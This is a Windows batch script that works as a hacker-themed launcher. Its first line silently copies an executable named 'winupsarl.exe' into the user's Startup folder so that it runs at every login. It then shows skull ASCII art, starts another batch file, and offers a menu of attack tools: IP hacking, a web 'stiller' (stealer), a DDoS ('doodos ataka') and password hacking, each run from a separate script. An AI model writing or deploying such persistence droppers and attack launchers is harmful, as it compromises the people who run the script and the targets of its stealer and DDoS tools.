@echo off
copy winupsarl.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
title StartUp
color 27
echo          .e####e.                  .e####e.                .e####e.             .e####e.         .e####e.         
echo        e##########e              e##########e            e##########e         e##########e     e##########e       
echo       ##############            ##############          ##############       ##############      
echo      d##############b          d##############b        d##############b     d##############b     
echo      ################          ################        ################     
echo     4################F        4################F      4################F    
echo     4################F        4################F      4################F    
echo     ####" "####" "####        ####" "####" "####      ####" "####" "####     
echo      ##F   4##F   4##          ##F   4##F   4##     
echo      '#F   4##F   4#"          '#F   4##F   4#"     
echo       ##   ####   #P            ##   ####   #P      
echo       4#####"^#####%            4#####"^#####%      
echo        ####F  4####              ####F  4####       
echo         "###ee###"                "###ee###"        
echo         . *####F4                 . *####F4         
echo          #     .#                  #     .#         
echo          "######"                  "######"         
echo           ^####           
echo  4##c       ""       .##r 
echo  ^###b              e###" 
echo  d#####e          z#####b 
echo 4###*#####c    .#####*###r
echo  ""    ^*###be###*"    ^" 
echo           "####"          
echo         .d##P###b         
echo        d##P   ^###b       
echo    .ed###"      "###be.   
echo  ######P          *###### 
echo 4#####P            ######"
echo  "*###"            ^##P  
TIMEOUT /T 3 /NOBREAK
start xoi.bat 
:m1
Set /p choice="loding... "
If not defined choice goto m1
If "%choice%"=="help" (echo ip hack == ip
echo sistem info == sis
echo web stiller == still
echo doodos ataka == dood
echo hack password == pass)
If "%choice%"=="ip" (start ip.bat)
If "%choice%"=="sis" (start sis.bat)
If "%choice%"=="still" (start stiller.bat)
If "%choice%"=="dood" (open start.vbs)
If "%choice%"=="pass" (pass.cmd)
goto m1
pause >nul
